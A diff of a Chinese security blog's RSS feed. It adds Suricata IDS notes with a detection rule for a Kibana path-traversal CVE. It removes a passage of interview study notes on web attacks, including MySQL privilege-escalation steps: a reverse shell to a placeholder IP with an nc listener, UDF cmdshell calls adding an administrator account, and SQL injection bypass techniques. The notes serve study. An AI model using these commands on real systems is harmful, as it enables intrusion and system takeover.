@@ -5,9 +5,170 @@
     <description>Walking to Dalao。</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Tue, 30 Jul 2019 23:30:12 +0800</pubDate>
-    <lastBuildDate>Tue, 30 Jul 2019 23:30:12 +0800</lastBuildDate>
+    <pubDate>Wed, 31 Jul 2019 21:30:54 +0800</pubDate>
+    <lastBuildDate>Wed, 31 Jul 2019 21:30:54 +0800</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>Suricata学习笔记</title>
+        <description>&lt;h2 id=&quot;suricata学习笔记&quot;&gt;Suricata学习笔记&lt;/h2&gt;
+
+&lt;h3 id=&quot;suricata安装步骤&quot;&gt;Suricata安装步骤：&lt;/h3&gt;
+
+&lt;p&gt;官网介绍使用wget下载压缩包解压后进行安装，流程相对复杂&lt;/p&gt;
+
+&lt;p&gt;经测试在ubuntu下可以直接使用&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo apt install Suricata&lt;/code&gt;进行安装&lt;/p&gt;
+
+&lt;h3 id=&quot;suricata-使用方法&quot;&gt;Suricata 使用方法：&lt;/h3&gt;
+
+&lt;p&gt;重放pcap包：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;suricata &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; suricata.yaml &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; none &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; cve-2018-7600.pcap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;监听网卡：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;suricata &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/suricata/suricata.yaml &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; wlan0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;使用原理：&lt;/p&gt;
+
+&lt;p&gt;Suricata通过用户自己编写的.rules规则文件对流量进行匹配，如果发现与规则匹配的流量则进行进一步的操作&lt;/p&gt;
+
+&lt;h3 id=&quot;suricata-规则编写&quot;&gt;Suricata 规则编写&lt;/h3&gt;
+
+&lt;p&gt;完整规则：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alert http any any -&amp;gt; any any &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg: &lt;span class=&quot;s2&quot;&gt;&quot;ATTACK [PTsecurity] Kibana &amp;lt; 6.4.3 &amp;lt;5.6.13 Arbitrary File Inclusion/Disclosure/RCE attempt (CVE-2018-17245)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; flow: established, to_server&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; content: &lt;span class=&quot;s2&quot;&gt;&quot;/api/console/api_server&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; http_uri&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; content: &lt;span class=&quot;s2&quot;&gt;&quot;SENSE_VERSION&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; nocase&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; http_uri&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; distance: 0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pcre: &lt;span class=&quot;s2&quot;&gt;&quot;/apis&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;*=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;*[^&amp;amp;]*(?:(?:%2e|&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)(?:%2e|&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)(?:%5c|%2f|&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;))/Ui&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; reference: cve, 2018-17245&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; reference: url, www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; reference: url, github.com/ptresearch/AttackDetection&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; metadata: Open Ptsecurity.com ruleset&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; classtype: attempted-admin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; sid: 30000027&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rev: 1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;alert&quot;&gt;alert：&lt;/h4&gt;
+
+&lt;p&gt;该参数用于指定规则触发的效果，包括一下四个参数可以选择：&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;alert&lt;/code&gt;:Suricata将触发警报，提示管理员系统存在异常操作行为。&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reject&lt;/code&gt;:拒绝该数据包。&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;drop&lt;/code&gt;:这仅涉及IPS /内联模式，匹配到规则后，停止传送该数据包&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pass&lt;/code&gt;:如果匹配成功，将停止扫描并跳过扫描该条数据&lt;/p&gt;
+
+&lt;h4 id=&quot;msg&quot;&gt;msg：&lt;/h4&gt;
+
+&lt;p&gt;该条配置指定如果流量中包含攻击流量，匹配成功后在日志中显示的信息。&lt;/p&gt;
+
+&lt;h4 id=&quot;flow&quot;&gt;flow：&lt;/h4&gt;
+
+&lt;p&gt;用于匹配流的方向，flow关键字也可以用来表示签名必须仅在流上匹配（only_stream）或仅在数据包（no_stream）上匹配。&lt;/p&gt;
+
+&lt;p&gt;flow参数可以包括以下几个关键词：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;to_client                       established           only_stream
+from_client                     stateless             no_stream
+to_server 
+from_server
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;from_server和to_client是一样的，to_server和from_client也是一样的。 这来自原始的Snort语言，我们支持它的兼容性的原因。&lt;/p&gt;
+
+&lt;p&gt;使用方法：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;flow:to_client, established&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+flow:from_client, established, only_stream&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;flowbits&quot;&gt;flowbits：&lt;/h5&gt;
+
+&lt;p&gt;适用于两个流量包进行比对时，&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Suricata-1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;第一条规则如果匹配成功，默认则会弹出警报，如果不需要警报则需要在后面追加参数&lt;code class=&quot;highlighter-rouge&quot;&gt;'flowbits：noalert&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;此规则的目的是检查&lt;code class=&quot;highlighter-rouge&quot;&gt;userlogin&lt;/code&gt;上的匹配，并在流程中标记该匹配。 所以，没有必要产生一个警报。&lt;br /&gt;
+第二条规则没有第一条规则就没有效果。 如果第一条规则匹配，则流程将该特定条件设置为在流中存在。 现在用第二个规则可以检查前一个分组是否满足第一个条件。 如果第二条规则匹配，则会生成警报。&lt;/p&gt;
+
+&lt;h4 id=&quot;content&quot;&gt;content&lt;/h4&gt;
+
+&lt;p&gt;使用content的参数对流量进行关键字匹配&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http_url&lt;/code&gt;说明content中内容匹配的数据存在于http的url中，还可以设置为&lt;code class=&quot;highlighter-rouge&quot;&gt;http_cookie&lt;/code&gt;等&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nocase&lt;/code&gt;设置content中的值不区分大小写&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;distance&lt;/code&gt;：表示第一次匹配后到下次匹配中间的偏移量&lt;/p&gt;
+
+&lt;h3 id=&quot;reference&quot;&gt;reference&lt;/h3&gt;
+&lt;p&gt;标明这条规则对应的信息所在的URL&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reference:url,www.info.nl
+如果在reference.config配置文件中存在关键字的引用关系，可以引用已经定义的关键字与url的对应关系例如：
+reference.config中定义cve对应的url为：http://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+则下面语句：
+reference:cve,2019-2653
+调用的url则为：http://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2019-2653
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;sid&quot;&gt;sid&lt;/h3&gt;
+&lt;p&gt;表示这条规则的id&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sid:number&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;rev&quot;&gt;rev&lt;/h3&gt;
+&lt;p&gt;表示该条规则的版本号&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rev:number&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;pcre&quot;&gt;pcre&lt;/h4&gt;
+
+&lt;p&gt;pcre关键字使用PCRE来匹配payload中的内容，用法一般是首先使用content匹配到指定字符串，然后根据pcre对相应的payload进行正则匹配&lt;/p&gt;
+
+&lt;p&gt;参考：&lt;a href=&quot;https://www.cnblogs.com/xh13dream/p/8604366.html&quot;&gt;https://www.cnblogs.com/xh13dream/p/8604366.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pcre-1.png&quot; alt=&quot;pcre匹配案例&quot; /&gt;&lt;br /&gt;
+pcre匹配 / 的时候需要配合 \ 进行转义&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pcre-2.png&quot; alt=&quot;pcre匹配案例&quot; /&gt;&lt;br /&gt;
+pcre匹配webshell&lt;/p&gt;
+
+&lt;p&gt;模式匹配中常用特殊字符&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;点号 .&lt;/strong&gt; ：
+匹配任何单个字符(换行符\n除外)
+&lt;strong&gt;反斜杠 \&lt;/strong&gt; ：
+转义字符，用于特殊符号前，使其失去特殊字符的作用变成普通字符
+&lt;strong&gt;加号 +&lt;/strong&gt; ：
+匹配该字符前面的&amp;lt;font color=red&amp;gt;字符（单个）&amp;lt;/font&amp;gt;至少一次；1次，2次…n次
+&lt;strong&gt;星号 *&lt;/strong&gt; ：
+匹配该字符前面的字符任意次：0次，1次…n次
+&lt;strong&gt;问号 ？&lt;/strong&gt; ：
+匹配该字符前面的字符0次或者一次
+&lt;strong&gt;.*&lt;/strong&gt; ：
+匹配任意字符任意次（换行符除外）
+&lt;strong&gt;{count}&lt;/strong&gt; ：
+匹配前面的字符count次
+&lt;strong&gt;{min，}&lt;/strong&gt; ：
+匹配前面的字符至少min次
+&lt;strong&gt;{min，max}&lt;/strong&gt; ：
+匹配至少min，至多max
+&lt;strong&gt;*？&lt;/strong&gt; ：
+匹配该字符前面的字符任意次：0次，1次…n次，倾向于短字符，非贪婪量词
+&lt;strong&gt;+？&lt;/strong&gt; ：
+匹配该字符前面的字符（单个）至少一次；1次，2次…n次，倾向于短字符，非贪婪量词
+&lt;strong&gt;（）&lt;/strong&gt; ：
+模式分组字符 eg：/(perl)+/  #有()匹配模式是perl，没有括号，匹配模式是单个字符l；&lt;/p&gt;
+</description>
+        <pubDate>Wed, 31 Jul 2019 00:18:43 +0800</pubDate>
+        <link>http://localhost:4000/2019/07/31/Suricata.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/07/31/Suricata.html</guid>
+        
+        <category>安全开发</category>
+        
+        <category>ALL</category>
+        
+        
+        <category>安全开发</category>
+        
+        <category>ALL</category>
+        
+      </item>
     
       <item>
         <title>钟馗之眼python调用框架</title>
@@ -1360,324 +1521,6 @@ java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 
         
         
         <category>面试</category>
-        
-        <category>WEB</category>
-        
-        <category>ALL</category>
-        
-      </item>
-    
-      <item>
-        <title>WEB安全面试复习笔记</title>
-        <description>&lt;h2 id=&quot;对web安全的理解&quot;&gt;对Web安全的理解&lt;/h2&gt;
-&lt;p&gt;我觉得 Web 安全首先得懂 Web、第三方内容、Web 前端框架、Web 服务器语言、Web 开发框架、Web 应用、Web容器、存储、操作系统等这些都要了解，然后较为常见且危害较大的，SQL 注入，XSS 跨站、CSRF 跨站请求伪造等漏洞要熟练掌握。&lt;br /&gt;
-第三方内容: 广告统计、mockup 实体模型&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;Web前端框架: jQuery 库、BootStrap&lt;br /&gt;
-Web服务端语言: aps.net、php&lt;br /&gt;
-Web开发框架: Diango/Rails/Thinkphp&lt;br /&gt;
-Web应用: BBS ( discuz、xiuno ) / CMS ( 帝国、织梦、动易、Joomla ) / BLOG ( WordPress、Z-Blog、emlog )&lt;br /&gt;
-Web 容器: Apache ( php )、IIS ( asp )、Tomcat ( java ) – 处理从客户端发出的请求&lt;br /&gt;
-存储：数据库存储 / 内存存储 / 文件存储&lt;br /&gt;
-操作系统: linux / Windows&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;http&quot;&gt;HTTP&lt;/h2&gt;
-&lt;h3 id=&quot;http常见状态码&quot;&gt;HTTP常见状态码&lt;/h3&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;1xx：信息提示，表示请求已被成功接收，继续处理。&lt;br /&gt;
-2xx：成功，服务器成功处理了请求&lt;br /&gt;
-3xx：重定向，告知客户端所请求的资源已经移动&lt;br /&gt;
-4xx：客户端错误状态码，请求了一些服务器无法处理的东西。&lt;br /&gt;
-5xx：服务端错误，描述服务器内部错误&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;http请求&quot;&gt;HTTP请求&lt;/h3&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;请求行 ( 请求方法 )、请求头 ( 消息报头 ) 和请求正文&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;http响应&quot;&gt;HTTP响应&lt;/h3&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;响应行，响应头 ( 消息报头 ) 和响应正文 ( 消息主题 )&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;get-和-post&quot;&gt;GET 和 POST：&lt;/h3&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;GET方法用于获取请求页面的指定信息，如点击链接
-POST方法是有请求内容的，由于向服务器发送大量数据，如提交表单&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;数据库&quot;&gt;数据库&lt;/h2&gt;
-&lt;p&gt;基本的SQL语句：&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;增：INSERT INTO table_name (列1, 列2,…) VALUES (值1, 值2,….)&lt;br /&gt;
-删：DELETE FROM 表名称 WHERE 列名称 = 值&lt;br /&gt;
-改：UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值&lt;br /&gt;
-查：SELECT 列名称 FROM 表名称&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;mysql默认自带表:&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;information_schema、performance_schema、sys、mysql&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;information_schema 数据库：
- mysql 自带的，它提供了访问元数据库的方式。&lt;br /&gt;
-sys 数据库 ：
-目标是把performance_schema的把复杂度降低&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;sys_config用于sys schema库的配置&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;sys中的两种表：&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;1.字母开头： 适合人阅读，显示是格式化的数
-2.x$开头 ： 适合工具采集数据，原始类数据&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;mysql 提权方式：&lt;br /&gt;
-&lt;strong&gt;&lt;em&gt;mof提权&lt;/em&gt;&lt;/strong&gt; &lt;br /&gt;
-拿到 Webshell 后： &lt;br /&gt;
-1、找一个可写目录上传mof文件，例如上传到 C:/Windows/nullevt.mof&lt;br /&gt;
-2、执行load_file及into dumpfile把文件导出到正确的位置即可:&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;Select load_file(‘C:/Windows/nullevt.mof’) into dumpfile ‘c:/windows/system32/wbem/mof/nullevt.mof’&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接即可
-&lt;strong&gt;&lt;em&gt;反弹端口提权&lt;/em&gt;&lt;/strong&gt; &lt;br /&gt;
-1、拿到 mysql root 权限，无法通过网站 Getshell，利用 mysql 客户端工具连接 mysql 服务器，然后执行下面的操作：&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;backshell&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yourip&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;2、本地监听你反弹的端口&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2010     
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;成功后，你将获得一个 system 权限的 cmdshell&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;em&gt;Mysql udf 提权&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;目录位置:&lt;/p&gt;
-
-&lt;p&gt;c:\windows\system32&lt;/p&gt;
-
-&lt;p&gt;1、最常见的是直接使用 udf.php (https://download.csdn.net/download/fly_hps/10752511 ) 此类的工具来执行 udf 提权&lt;/p&gt;
-
-&lt;p&gt;具体如下:&lt;/p&gt;
-
-&lt;p&gt;连接到 mysql 以后，先导出 udf.dll 到 c:\windows\system32 目录下。&lt;/p&gt;
-
-&lt;p&gt;2、创建相应的函数并执行命令，具体如下：&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cmdshell&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;soname&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'udf.dll'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmdshell&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'net user wintry wintry /add'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmdshell&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'net localgroup administrators wintry /add'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;drop&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cmdshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;delete&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmdshell'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h3 id=&quot;sql注入总结&quot;&gt;sql注入总结&lt;/h3&gt;
-&lt;p&gt;####总体见解：
-1.只要是支持批处理SQL指令的数据库服务器，都有可能受到此种手法的攻击。&lt;br /&gt;
-2.注入的本质，是把用户输入数据作为代码执行。有两个关键条件：第一个是用户能控制输入；第二是原本程序要执行的代码，拼接了用户输入的数据，把数据当代码执行了。（出自吴瀚清《白帽子讲WEB安全》）&lt;br /&gt;
-3.错误的回显是敏感信息，是攻击者了解某网站web服务器的重要手段。&lt;br /&gt;
-4.最常见的盲注验证方法是，构造简单的条件语句，根据返回页面是否发生变化，判断SQL语句是否得到执行。例如http://a.b.c/item.php?id=2中，执行的SQL为：select title,body FROM item where ID =2可以 将域名改为http://a.b.c/item.php?id=2or 1=1，通过注入数据，再对返回页面进行差异结果比较。两次结果不一样，证明存在注入漏洞。&lt;br /&gt;
-####SQL注入原理：&lt;br /&gt;
-SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。（从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取你想到得到的资料）&lt;/p&gt;
-&lt;h3 id=&quot;sql注入漏洞常见类型&quot;&gt;SQL注入漏洞常见类型：&lt;/h3&gt;
-&lt;p&gt;1.没有正确过滤转义字符 &lt;br /&gt;
-2.Incorrecttypehandling &lt;br /&gt;
-3.数据库服务器中的漏洞 &lt;br /&gt;
-4.盲目SQL注入式攻击&lt;br /&gt;
-5.条件响应&lt;br /&gt;
-6.条件性差错&lt;br /&gt;
-7.时间延误&lt;/p&gt;
-&lt;h3 id=&quot;sql注入点的类型&quot;&gt;SQL注入点的类型：&lt;/h3&gt;
-&lt;p&gt;1，数字型注入点&lt;br /&gt;
-2，字符型注入点&lt;br /&gt;
-3，搜索型注入点：&lt;br /&gt;
-这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示的链接地址，而是直接通过搜索框表单提交。&lt;br /&gt;
-SQL注入原因：&lt;br /&gt;
-①不当的类型处理；&lt;br /&gt;
-②不安全的数据库配置；&lt;br /&gt;
-③不合理的查询集处理；&lt;br /&gt;
-④不当的错误处理；&lt;br /&gt;
-⑤转义字符处理不合适；&lt;br /&gt;
-⑥多个提交处理不当。&lt;/p&gt;
-&lt;h3 id=&quot;sql注入一般步骤&quot;&gt;SQL注入一般步骤：&lt;/h3&gt;
-&lt;p&gt;发现SQL注入位置；&lt;br /&gt;
-·判断环境，寻找注入点，判断数据库类型；  &lt;br /&gt;
-其次，根据注入参数类型，在脑海中重构SQL语句的原貌，按参数类型主要分为下面三种： &lt;br /&gt;
-(A) ID=49这类注入的参数是数字型， &lt;br /&gt;
-SQL语句原貌大致如下：Select * from表名where字段=49注入的参数为ID=49 And [查询条件]，即是生成语句：Select * from表名where字段=49 And [查询条件] &lt;br /&gt;
-(B) Class=连续剧这类注入的参数是字符型， &lt;br /&gt;
-SQL语句原貌大致概如下：Select * from表名where字段=’连续剧’注入的参数为Class=连续剧’ and [查询条件]and‘’=’，即是生成语句：Select * from表名where字段=’连续剧’ and [查询条件] and‘’=’’ &lt;br /&gt;
-(C)搜索时没过滤参数的， &lt;br /&gt;
-如keyword=关键字，SQL语句原貌大致如下：Select * from表名where字段like ’%关键字%’注入的参数为keyword=’ and [查询条件] and ‘%25’=’，即是生成语句：Select * from表名where字段like ’%’ and [查询条件]and‘%’=’%’·发现WEB虚拟目录，将查询条件替换成SQL语句，猜解表名，猜列名，猜目标目录的字段长度。&lt;/p&gt;
-&lt;h3 id=&quot;数据库攻击常用技巧&quot;&gt;数据库攻击常用技巧：&lt;/h3&gt;
-&lt;p&gt;猜表名，确认表名，列名&lt;br /&gt;
-·上传ASP木马，留下后门；&lt;br /&gt;
-·得到管理员权限，窃取数据；&lt;br /&gt;
-ASP木马只有USER权限，要想获取对系统的完全控制，还要有系统的管理员权限。怎么办？&lt;br /&gt;
-提升权限的方法有很多种：&lt;br /&gt;
-上传木马，修改开机自动运行的.ini文件（它一重启，便死定了）；&lt;br /&gt;
-复制CMD.exe到scripts，人为制造UNICODE漏洞；下载SAM文件，破解并获取OS的所有用户名密码；   等等，视系统的具体情况而定，可以采取不同的方法。&lt;/p&gt;
-&lt;h3 id=&quot;如何判断sqli注入有哪些方法&quot;&gt;如何判断sqli注入，有哪些方法？&lt;/h3&gt;
-&lt;p&gt;添加单引号，双引号，order by, sleep，benchmark，运算符，修改数据类型，报错注入语句测试&lt;/p&gt;
-&lt;h3 id=&quot;mysql的用户名密码是放在哪张表里面&quot;&gt;mysql的用户名密码是放在哪张表里面？&lt;/h3&gt;
-&lt;p&gt;mysql数据库下的user表。&lt;/p&gt;
-
-&lt;h3 id=&quot;sql注入过滤绕过总结&quot;&gt;sql注入过滤绕过总结&lt;/h3&gt;
-&lt;h4 id=&quot;注释符号绕过&quot;&gt;注释符号绕过：&lt;/h4&gt;
-&lt;p&gt;常用的注释符有&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;注释内容&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;# 注释内容&lt;/span&gt;
-&lt;span class=&quot;cm&quot;&gt;/*注释内容*/&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;大小写绕过&quot;&gt;大小写绕过：&lt;/h4&gt;
-&lt;p&gt;常用于waf的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。&lt;br /&gt;
